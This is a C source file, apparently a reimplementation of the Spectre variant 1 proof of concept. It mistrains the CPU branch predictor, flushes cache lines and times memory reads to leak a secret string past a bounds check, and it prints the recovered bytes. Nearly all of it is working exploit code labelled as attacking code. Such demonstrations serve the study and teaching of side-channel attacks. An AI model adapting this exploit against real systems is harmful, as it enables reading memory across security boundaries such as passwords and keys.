#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/*
VICTIM CODE
*/

unsigned int arr1_size = 16;

uint8_t arr1[160] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};

uint8_t arr2[256 * 512];

char * secret = "password";

int fetch_victim(size_t index){
    if(index < arr1_size){
        return arr2[arr1[index] * 512];
    }else{
        return -1;
    }
}


/*
ATTACKING CODE
*/

// GLOBAL PARAMETERS
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
bool attack[100]; //If TRUE then attack ELSE misstrain again.
int results[256]; //Holds the results for each character.
int char_patern[256]; //Random ASCII Char.
int train_loops = 100;

// Phase 1 - Misstrain processor by feeding processes. (e.g. Manipulating the cache state to remove data that the processor will need to determine the actual control flow.)
//         - Prepare for side-channel attack.(e.g. perform flush or evict part of a Flush+Reload or Evict-Reload attack.)

void misstrain_proc(size_t target_idx, int tries){
    int i,j;
    size_t train_idx, idx;
    // Flush the arr2 out of cache memory
    for(i = 0; i < 256; i++){
        _mm_clflush(&arr2[i * 512]);
    }

    // Training idx is the correct idx that is within arr1_size, which will train the branch predictor that brach is mostly taken
    train_idx = tries % arr1_size;

    for (i = 100 - 1; i >= 0; i--){
        _mm_clflush(&arr1_size);
        // This loop executes the delay inbetween the successive training loops
        for(j = 0; j < 100; j++){
            ;
        }

        //idx = (i % 6) ? train_idx : target_idx;
        //We should avoid the if-else condition here, as the if-else invokes the use of branch predictor here, which will then detect our logic here
        idx = attack[i] * target_idx + (!attack[i]) * train_idx;

        /* Call the victim function with the training_x (to mistrain branch predictor) or target_x (to attack the SECRET address) */
        fetch_victim(idx);
    }
}

// Overall attack function.
void readMemoryByte(size_t target_idx, uint8_t value[2], int score[2]){
    int j, k;
    unsigned int junk = 0;
    int i, mix_i = 0;
    volatile uint8_t *addr;
    register uint64_t time1, time2;

    // Initializing the results array
    memset(results, 0, sizeof(results));

    for (int tries = 1000 - 1; tries > 0; --tries){
        // First misstrain the proccesor.
        misstrain_proc(target_idx,tries);
        
        //Side channel attack to retrieve the data.
        for (i = 0; i < 256; i++) {
          mix_i = ((i * 167) + 13) & 255;
          addr = & arr2[mix_i * 512];
          time1 = __rdtscp( & junk); /* READ TIMER */
          junk = * addr; /* MEMORY ACCESS TO TIME */
          time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
          if (time2 <= CACHE_HIT_THRESHOLD && mix_i != arr1[tries % arr1_size])
            results[mix_i]++; /* cache hit - add +1 to score for this value */
        }

        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (i = 0; i < 256; i++) {
          if (j < 0 || results[i] >= results[j]) {
            k = j;
            j = i;
          } else if (k < 0 || results[i] >= results[k]) {
            k = i;
          }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0)){
          break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
        }
    }
    // Store the results.
    results[0] ^= junk; /* use junk so code above won’t get optimized out*/
    value[0] = (uint8_t) j;
    score[0] = results[j];
    value[1] = (uint8_t) k;
    score[1] = results[k];
}


int main()
{
    size_t malicious_x = (size_t)(secret - (char * ) arr1);
    int i, score[2], len = 8;
    uint8_t value[2];

    //set all values of array 2 as 1
    for (size_t i = 0; i < sizeof(arr2); i++){
        arr2[i] = 1; /* write to arr2 so in RAM not copy-on-write zero pages */
    }

    /* Here the char pattern array is initiated*/
    for (int i = 0; i < 256; ++i){
        char_patern[i] = i;
    }
    /* Here the bool values , for whether to attack or mistrain is set. 1 in every 10 will attack. */
    for (int i = 0; i < 100; i += 10){
        attack[i] = true;
    }

    printf("Reading %d bytes:\n", len);
    while (--len >= 0) {
        printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
        readMemoryByte(malicious_x++,value,score);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X=’%c’ score=%d ", value[0],
        (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0){
            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
            printf("\n");
        }
    }
    return (0);
}